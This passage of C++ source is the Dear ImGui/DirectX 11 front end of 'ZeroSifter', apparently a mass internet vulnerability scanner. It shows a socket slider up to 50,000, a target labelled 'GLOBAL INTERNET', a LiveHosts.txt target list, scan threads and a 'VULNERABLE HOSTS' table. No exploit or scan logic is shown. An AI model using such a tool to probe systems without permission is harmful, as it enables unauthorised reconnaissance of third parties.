    ImVec4 colorBg = ImVec4(0.05f, 0.05f, 0.07f, 1.00f);
    ImVec4 colorPanel = ImVec4(0.07f, 0.07f, 0.10f, 1.00f);
    ImVec4 colorPurple = ImVec4(0.55f, 0.50f, 0.90f, 1.00f);
    ImVec4 colorPurpleActive = ImVec4(0.65f, 0.60f, 1.00f, 1.00f);
    ImVec4 colorPurpleDark = ImVec4(0.45f, 0.40f, 0.80f, 1.00f);
    style.Colors[ImGuiCol_WindowBg] = colorBg; style.Colors[ImGuiCol_ChildBg] = colorPanel;
    style.Colors[ImGuiCol_Border] = ImVec4(0.2f, 0.2f, 0.3f, 0.5f); style.Colors[ImGuiCol_Text] = ImVec4(0.8f, 0.8f, 0.9f, 1.00f);
    style.Colors[ImGuiCol_Button] = colorPurple; style.Colors[ImGuiCol_ButtonHovered] = colorPurpleActive; style.Colors[ImGuiCol_ButtonActive] = colorPurpleDark;
    style.Colors[ImGuiCol_FrameBg] = ImVec4(0.15f, 0.15f, 0.20f, 1.00f); style.Colors[ImGuiCol_FrameBgHovered] = ImVec4(0.25f, 0.20f, 0.35f, 1.00f); style.Colors[ImGuiCol_FrameBgActive] = colorPurpleDark;
    style.Colors[ImGuiCol_SliderGrab] = colorPurple; style.Colors[ImGuiCol_SliderGrabActive] = colorPurpleActive;
    style.Colors[ImGuiCol_Header] = colorPurple; style.Colors[ImGuiCol_HeaderHovered] = colorPurpleActive; style.Colors[ImGuiCol_HeaderActive] = colorPurpleDark;
    style.Colors[ImGuiCol_PlotLines] = colorPurple; style.Colors[ImGuiCol_PlotLinesHovered] = colorPurpleActive;
    style.Colors[ImGuiCol_ModalWindowDimBg] = ImVec4(0, 0, 0, 0.8f);

    ImGui_ImplWin32_Init(hwnd); ImGui_ImplDX11_Init(g_pd3dDevice, g_pd3dDeviceContext);

    static float values[150] = {}; static int values_offset = 0;

    std::thread onlineCheck([]() {
        while (!g_AppExiting) {
            g_Config.isOnline = InternetCheckConnection(L"http://www.google.com", FLAG_ICC_FORCE_CONNECTION, 0);
            std::this_thread::sleep_for(std::chrono::seconds(2));
        }
        });

    PreFlightCheck();

    bool done = false;
    while (!done) {
        MSG msg; while (::PeekMessage(&msg, NULL, 0U, 0U, PM_REMOVE)) { ::TranslateMessage(&msg); ::DispatchMessage(&msg); if (msg.message == WM_QUIT) done = true; }
        if (done) break;

        std::deque<LogEntry> tempLogs;
        g_LogQueue.ConsumeAll(tempLogs);
        if (!tempLogs.empty()) {
            for (const auto& log : tempLogs) g_UI_Logs.push_back(log);
            while (g_UI_Logs.size() > 1000) g_UI_Logs.pop_front();
        }

        ImGui_ImplDX11_NewFrame(); ImGui_ImplWin32_NewFrame(); ImGui::NewFrame();

        if (g_ShowOfflinePopup) ImGui::OpenPopup("CONNECTION ERROR");
        if (g_ShowFilePopup) ImGui::OpenPopup("FILE ERROR");
        if (g_ShowCompletePopup) ImGui::OpenPopup("SCAN COMPLETE");

        ImGui::PushStyleColor(ImGuiCol_TitleBg, colorPurple);
        if (ImGui::BeginPopupModal("CONNECTION ERROR", NULL, ImGuiWindowFlags_AlwaysAutoResize | ImGuiWindowFlags_NoMove)) {
            ImGui::TextColored(ImVec4(1, 0.2f, 0.2f, 1), "NETWORK UNREACHABLE"); ImGui::Separator(); ImGui::Spacing();
            ImGui::Text("The system cannot reach the global network."); ImGui::Spacing();
            if (ImGui::Button("UNDERSTOOD", ImVec2(200, 40))) { g_ShowOfflinePopup = false; ImGui::CloseCurrentPopup(); }
            ImGui::EndPopup();
        }
        if (ImGui::BeginPopupModal("FILE ERROR", NULL, ImGuiWindowFlags_AlwaysAutoResize | ImGuiWindowFlags_NoMove)) {
            ImGui::TextColored(ImVec4(1, 0.2f, 0.2f, 1), "TARGET LIST MISSING OR EMPTY"); ImGui::Separator(); ImGui::Spacing();
            ImGui::Text("File 'LiveHosts.txt' not found or invalid format."); ImGui::Spacing();
            if (ImGui::Button("ACKNOWLEDGE", ImVec2(200, 40))) { g_ShowFilePopup = false; ImGui::CloseCurrentPopup(); }
            ImGui::EndPopup();
        }
        if (ImGui::BeginPopupModal("SCAN COMPLETE", NULL, ImGuiWindowFlags_AlwaysAutoResize | ImGuiWindowFlags_NoMove)) {
            ImGui::TextColored(ImVec4(0.2f, 1.0f, 0.2f, 1), "OPERATION FINISHED"); ImGui::Separator(); ImGui::Spacing();
            ImGui::Text("All loaded targets have been successfully processed."); ImGui::Spacing();
            if (ImGui::Button("ACKNOWLEDGE", ImVec2(200, 40))) { g_ShowCompletePopup = false; ImGui::CloseCurrentPopup(); }
            ImGui::EndPopup();
        }
        ImGui::PopStyleColor();

        ImGui::SetNextWindowPos(ImVec2(0, 0)); ImGui::SetNextWindowSize(io.DisplaySize);
        ImGui::Begin("Main", NULL, ImGuiWindowFlags_NoTitleBar | ImGuiWindowFlags_NoResize | ImGuiWindowFlags_NoMove | ImGuiWindowFlags_NoCollapse);

        ImGui::TextColored(ImVec4(0.6f, 0.6f, 0.7f, 1.0f), "ZeroSifter | SYSTEM:"); ImGui::SameLine();
        if (g_Config.isOnline) ImGui::TextColored(ImVec4(0, 1, 0, 1), "ONLINE");
        else ImGui::TextColored(ImVec4(1, 0, 0, 1), "OFFLINE");
        ImGui::Separator(); ImGui::Spacing();

        // GEOMETRY SHIFT: Terminal reduced by 50px, Hosts expanded by 50px
        ImGui::Columns(3, "MainCols", false);
        ImGui::SetColumnWidth(0, 350);
        ImGui::SetColumnWidth(1, io.DisplaySize.x - 800);
        ImGui::SetColumnWidth(2, 450);

        // --- LEFT CONFIG ---
        ImGui::BeginChild("Config", ImVec2(0, 460), true);
        ImGui::Text("CONFIGURATION"); ImGui::Separator(); ImGui::Spacing();
        ImGui::Text("Target: GLOBAL INTERNET"); ImGui::Spacing();

        ImGui::Text("Concurrent Sockets"); ImGui::SetNextItemWidth(-1);
        int cSock = g_Config.concurrentSockets;
        if (ImGui::SliderInt("##sock", &cSock, 100, 50000)) g_Config.concurrentSockets = cSock;
        ImGui::Spacing(); ImGui::Dummy(ImVec2(0, 20));

        if (g_Config.currentState == STATE_RUNNING) {
            ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(0.8f, 0.2f, 0.2f, 1.0f));
            if (ImGui::Button("STOP", ImVec2(-1, 50))) StartJanitorCleanup();
            ImGui::PopStyleColor();
        }
        else if (g_Config.currentState == STATE_STOPPING) {
            ImGui::BeginDisabled(); ImGui::Button("STOPPING...", ImVec2(-1, 50)); ImGui::EndDisabled();
        }
        else {
            if (ImGui::Button("START", ImVec2(-1, 50))) {
                if (g_Config.isOnline) {
                    if (!LoadMasterTasks()) {
                        g_ShowFilePopup = true;
                    }
                    else {
                        g_hIOCP = CreateIoCompletionPort(INVALID_HANDLE_VALUE, NULL, 0, 0);
                        if (g_hIOCP) {
                            g_Config.currentState = STATE_RUNNING;
                            g_PendingConnections.store(0);
                            g_ScannerThread = std::thread(IOCPScannerEngine);

                            for (int i = 0; i < std::thread::hardware_concurrency() * 2; i++) {
                                g_ThreadPool.emplace_back(IOCPWorker);
                            }
                            g_LogQueue.Push({ GetTimeStr(), "SYS", "Engine Started", ImVec4(0,1,0,1) });
                        }
                    }
                }
                else g_ShowOfflinePopup = true;
            }
        }
        ImGui::EndChild();
        ImGui::Spacing();

        // --- STATS ---
        ImGui::BeginChild("Stats", ImVec2(0, 0), true, ImGuiWindowFlags_NoScrollbar);
        ImGui::Text("LIVE STATS"); ImGui::Separator();
        static auto lastTime = std::chrono::steady_clock::now();
        static long long lastCount = 0;
        auto now = std::chrono::steady_clock::now();
        if (std::chrono::duration_cast<std::chrono::milliseconds>(now - lastTime).count() > 200) {
            long long curr = g_TotalProcessed;
            g_ScanSpeed = (double)(curr - lastCount) * 5.0;
            lastCount = curr; lastTime = now;
        }
        values[values_offset] = (float)g_ScanSpeed; values_offset = (values_offset + 1) % IM_ARRAYSIZE(values);
        ImGui::PlotLines("##Speed", values, IM_ARRAYSIZE(values), values_offset, NULL, 0.0f, FLT_MAX, ImVec2(-1, 100));
        ImGui::Spacing();

        ImGui::Text("Processed Ports: %lld", g_TotalProcessed.load());
        ImGui::Text("Vulns Found:     %lld", g_TotalVuln.load());
        ImGui::Text("Active Sockets:  %lld", g_PendingConnections.load());

        ImGui::EndChild();
        ImGui::NextColumn();

        // --- TERMINAL ---
        ImGui::BeginChild("Terminal", ImVec2(0, 0), true);
        ImGui::Text("LIVE TERMINAL"); ImGui::Separator();

        ImGui::PushStyleColor(ImGuiCol_TableHeaderBg, ImVec4(0.07f, 0.07f, 0.10f, 1.00f));
        ImGui::PushStyleColor(ImGuiCol_TableBorderStrong, ImVec4(0, 0, 0, 0));
        ImGui::PushStyleColor(ImGuiCol_TableBorderLight, ImVec4(0, 0, 0, 0));
        ImGui::PushStyleVar(ImGuiStyleVar_CellPadding, ImVec2(6, 6));

        ImGuiTableFlags logFlags = ImGuiTableFlags_SizingFixedFit | ImGuiTableFlags_NoBordersInBody | ImGuiTableFlags_NoBordersInBodyUntilResize | ImGuiTableFlags_ScrollY;
        if (ImGui::BeginTable("LogTable", 3, logFlags, ImVec2(0, 0))) {
            ImGui::TableSetupScrollFreeze(0, 1);
            ImGui::TableSetupColumn("Time", ImGuiTableColumnFlags_WidthFixed, 100.0f);
            ImGui::TableSetupColumn("Type", ImGuiTableColumnFlags_WidthFixed, 60.0f);
            ImGui::TableSetupColumn("Msg", ImGuiTableColumnFlags_WidthStretch);

            ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(0.5f, 0.5f, 0.6f, 1));
            ImGui::TableHeadersRow();
            ImGui::PopStyleColor();

            ImGuiListClipper clipper; clipper.Begin(static_cast<int>(g_UI_Logs.size()));
            while (clipper.Step()) {
                for (int i = clipper.DisplayStart; i < clipper.DisplayEnd; i++) {
                    // ZERO-SNAKE WATERFALL PROTOCOL (Reverse Iteration)
                    const auto& it = g_UI_Logs[g_UI_Logs.size() - 1 - i];
                    ImGui::TableNextRow();

                    ImGui::TableNextColumn();
                    ImGui::TextColored(ImVec4(0.6f, 0.6f, 0.6f, 1), "%s", it.timestamp.c_str());

                    ImGui::TableNextColumn();
                    ImGui::TextColored(it.typeColor, "%s", it.type.c_str());

                    ImGui::TableNextColumn();
                    ImGui::Text("%s", it.msg.c_str());
                }
            }
            clipper.End();
            ImGui::EndTable();
        }
        ImGui::PopStyleVar();
        ImGui::PopStyleColor(3);

        ImGui::EndChild();
        ImGui::NextColumn();

        // --- VULNERABLE HOSTS (TABLE API ZENITH) ---
        ImGui::BeginChild("Hosts", ImVec2(0, 0), true);
        ImGui::Text("VULNERABLE HOSTS"); ImGui::Separator();

        ImGui::PushStyleColor(ImGuiCol_TableHeaderBg, ImVec4(0.07f, 0.07f, 0.10f, 1.00f));
        ImGui::PushStyleColor(ImGuiCol_TableBorderStrong, ImVec4(0, 0, 0, 0));
        ImGui::PushStyleColor(ImGuiCol_TableBorderLight, ImVec4(0, 0, 0, 0));
        ImGui::PushStyleVar(ImGuiStyleVar_CellPadding, ImVec2(6, 6));

        ImGuiTableFlags hostFlags = ImGuiTableFlags_SizingFixedFit | ImGuiTableFlags_NoBordersInBody | ImGuiTableFlags_NoBordersInBodyUntilResize | ImGuiTableFlags_ScrollY;
        if (ImGui::BeginTable("HostsTable", 3, hostFlags, ImVec2(0, 0))) {
            ImGui::TableSetupScrollFreeze(0, 1);

            ImGui::TableSetupColumn("IP", ImGuiTableColumnFlags_WidthFixed, 110.0f);
            ImGui::TableSetupColumn("Type", ImGuiTableColumnFlags_WidthFixed, 150.0f);
            ImGui::TableSetupColumn("Port", ImGuiTableColumnFlags_WidthStretch);

            ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(0.5f, 0.5f, 0.6f, 1));
            ImGui::TableHeadersRow();
            ImGui::PopStyleColor();

            std::lock_guard<std::mutex> lock(g_UIVulnsMutex);
            ImGuiListClipper clipper; clipper.Begin(static_cast<int>(g_UI_Vulns.size()));
            while (clipper.Step()) {
                for (int i = clipper.DisplayStart; i < clipper.DisplayEnd; i++) {
                    const auto& h = g_UI_Vulns[i];
                    ImGui::TableNextRow();

                    ImGui::TableNextColumn();
                    float wrapLimitIP = ImGui::GetCursorPos().x + 105.0f;
                    ImGui::PushTextWrapPos(wrapLimitIP);
                    ImGui::TextColored(ImVec4(1.0f, 0.2f, 0.2f, 1.0f), "%s", h.ip.c_str());
                    ImGui::PopTextWrapPos();

                    ImGui::TableNextColumn();
                    float wrapLimitType = ImGui::GetCursorPos().x + 145.0f;
                    ImGui::PushTextWrapPos(wrapLimitType);
                    ImGui::Text("%s", h.type.c_str());
                    ImGui::PopTextWrapPos();

                    ImGui::TableNextColumn();
                    // ABSOLUTE SAFE-ZONE: Guaranteed 80px space for ports before forced break.
                    float wrapLimitPort = ImGui::GetCursorPos().x + 80.0f;
                    ImGui::PushTextWrapPos(wrapLimitPort);
                    ImGui::TextColored(ImVec4(0.65f, 0.60f, 1.00f, 1.0f), "%d", h.port);
                    ImGui::PopTextWrapPos();
                }
            }
            clipper.End();
            if (g_NewVulnFound) { ImGui::SetScrollHereY(1.0f); g_NewVulnFound = false; }
            ImGui::EndTable();
        }
        ImGui::PopStyleVar();
        ImGui::PopStyleColor(3);

        ImGui::EndChild();
        ImGui::End();

        ImGui::Render(); g_pd3dDeviceContext->OMSetRenderTargets(1, &g_mainRenderTargetView, NULL);
        ImVec4 clear_color = ImVec4(0.05f, 0.05f, 0.07f, 1.00f);
        g_pd3dDeviceContext->ClearRenderTargetView(g_mainRenderTargetView, (float*)&clear_color);
        ImGui_ImplDX11_RenderDrawData(ImGui::GetDrawData());
        g_pSwapChain->Present(1, 0);
    }

    g_AppExiting = true;
    StartJanitorCleanup();
    if (g_JanitorThread.joinable()) g_JanitorThread.join();
    if (onlineCheck.joinable()) onlineCheck.join();

    g_Config.currentState = STATE_STOPPING;
    if (g_hIOCP) CloseHandle(g_hIOCP);

    ImGui_ImplDX11_Shutdown(); ImGui_ImplWin32_Shutdown(); ImGui::DestroyContext(); CleanupDeviceD3D(); DestroyWindow(hwnd); UnregisterClass(wc.lpszClassName, wc.hInstance); WSACleanup();
    return 0;
}
